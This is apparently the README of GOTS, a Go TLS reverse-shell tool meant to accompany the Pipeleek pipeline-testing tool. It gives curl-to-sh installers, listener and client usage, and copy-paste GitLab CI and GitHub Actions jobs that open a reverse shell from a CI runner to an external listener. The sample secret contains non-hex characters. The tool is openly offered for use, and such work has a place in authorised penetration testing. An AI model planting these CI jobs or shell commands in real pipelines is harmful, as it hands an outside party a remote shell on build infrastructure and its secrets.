<div align="center">
  <img src="pipeleek_gots.svg" alt="pipeleek_gots" width="200" />
</div>

# GOTS - Golang TCP/TLS (Reverse) Shell - For Pipeleek

> **⚠️ Disclaimer**: This project was entirely generated using AI (GitHub Copilot). Use at your own risk in production environments.

Minimal, encrypted reverse shell over raw TCP with TLS 1.3.

Use this when you need a self-hosted, encrypted reverse shell alternative—for example, when tools like [sshx](https://sshx.io/) cannot be used due to customer concerns about data residency or third-party hosting requirements. This is meant to be a companion for [Pipeleek](https://github.com/CompassSecurity/pipeleek).

## Install
- Binstaller (recommended):
  - gotsl (Listener, gots left): `curl -fsSL https://frjcomp.github.io/gots/install-gotsl.sh | sh`
  - gotsr (Client, gots right): `curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh`
  - Set `BINSTALLER_BIN` to change install dir (defaults to `~/.local/bin`).

- From source:
  ```bash
  git clone https://github.com/frjcomp/gots.git
  cd gots
  make build  # outputs to bin/
  ```

## Usage

### Basic Usage
- Start gotsl (Listener, TLS, self-signed):
  ```bash
  ./gotsl <port> <bind-ip>
  ```
- Start gotsr (Reverse shell client):
  ```bash
  ./gotsr <host:port> <max-retries>
  ```
- Core gotsl commands: `list`, `shell <client_id>`, `exit`.
- In a session: run shell commands; `Ctrl D` to return.

**Quick tips:**
First connection without a fingerprint will still work with a self-signed cert; the client (`gotsr`) logs a warning and prints the certificate fingerprint. If you use pinning, obtain and verify the fingerprint via a trusted channel (e.g., printed by `gotsl`) before using `--cert-fingerprint`.


### Shared Secret Authentication
For additional security, use a shared secret handshake between listener and client:

1. Start `gotsl` with `-s` flag to auto-generate a secret:
   ```bash
   ./gotsl -s <port> <bind-ip>
   ```
   This prints the full gotsr command with the hex-encoded secret and certificate fingerprint. You might need to adapt the IP address:
   ```
   ✓ Shared secret authentication enabled
   Secret (hex): 47e5e491ed1308f0fe4f83520fddb8f45cf3c1094f4e1d387cdb0e99b6c3f426a1b2c3d4e5f6g7h8i
   
   To connect, use:
   ./gotsr -s 47e5e491ed1308f0fe4f83520fddb8f45cf3c1094f4e1d387cdb0e99b6c3f426a1b2c3d4e5f6g7h8i --cert-fingerprint 686033a3b9db41c3877e484f4df210ac98bff296da9d6f99ef36f1394c1946ee 127.0.0.1:8443 1
   ```

2. Start `gotsr` with the hex-encoded secret and fingerprint:
   ```bash
   ./gotsr -s <hex-secret> --cert-fingerprint <fingerprint> <host:port> <max-retries>
   ```

The listener will log a warning if the client fails to authenticate with the correct secret.

### Certificate Verification & Pinning
The client validates the server certificate during the TLS handshake:

- Pinning (**recommended**): If `--cert-fingerprint` is provided, the client pins to the leaf certificate's SHA256 fingerprint (DER) and rejects mismatches (prevents MITM). The generated fingerprint is printed at startup by the listener.
- CA-signed certs: If no fingerprint is provided and the certificate is CA-signed and valid, the connection is accepted.
- Self-signed without fingerprint: The connection is allowed, and the client logs a clear security warning and prints the server fingerprint. If you choose to pin, obtain and verify the fingerprint via a trusted channel before using `--cert-fingerprint`.

## Testing
- Run unit and integration tests locally:
  ```bash
  go test -race ./...
  ```
- Run only integration tests (end-to-end CLI tests):
  ```bash
  go test -race ./integration
  ```
  Integration tests invoke the compiled binaries to test full workflows, including PTY sessions, file transfers, and authentication scenarios.

## CI examples

The following examples can be copied to run `gotsr` in common CI/CD environments.

GitLab CI (`.gitlab-ci.yml`):
  ```yaml
  stages: [run]
  reverse:
    stage: run
    image: alpine:3.19
    script:
      - apk add --no-cache curl
      - curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
      - ~/.local/bin/gotsr listener.example.com:8443 3
  ```

GitHub Actions:
  ```yaml
  name: reverse
  on: [workflow_dispatch]
  jobs:
    run-reverse:
      runs-on: ubuntu-latest
      steps:
        - name: Install gotsr client
          run: curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
        - name: Run gotsr
          run: ~/.local/bin/gotsr listener.example.com:8443 3
  ```

GitHub Actions (Windows, PowerShell):
  ```yaml
  name: reverse-windows
  on: [workflow_dispatch]
  jobs:
    run-reverse:
      runs-on: windows-latest
      steps:
        - name: Install gotsr client (PowerShell)
          shell: pwsh
          run: |
            & "C:/Program Files/Git/bin/bash.exe" -lc "curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh"
        - name: Run gotsr (PowerShell)
          shell: pwsh
          run: |
            & "$HOME/.local/bin/gotsr" listener.example.com:8443 3
  ```

GitLab CI (Windows runner, PowerShell):
  ```yaml
  stages: [run]
  reverse-win:
    stage: run
    tags: [windows]  # ensure your runner has this tag
    script:
      - '"C:/Program Files/Git/bin/bash.exe" -lc "curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh"'
      - '"C:/Users/Administrator/.local/bin/gotsr" listener.example.com:8443 3'
  ```
